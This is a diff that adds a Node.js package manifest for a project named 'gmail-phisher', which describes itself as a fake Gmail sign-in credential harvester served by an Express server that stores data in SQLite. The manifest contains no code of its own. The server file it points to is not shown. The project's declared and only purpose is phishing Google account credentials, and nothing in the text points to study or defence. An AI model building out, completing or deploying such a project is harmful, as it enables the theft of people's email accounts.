@@ -1,0 +1,14 @@
+{
+  "name": "gmail-phisher",
+  "version": "1.0.0",
+  "description": "Fake Gmail sign-in credential harvester",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "better-sqlite3": "^9.4.3",
+    "cors": "^2.8.5"
+  }
+}
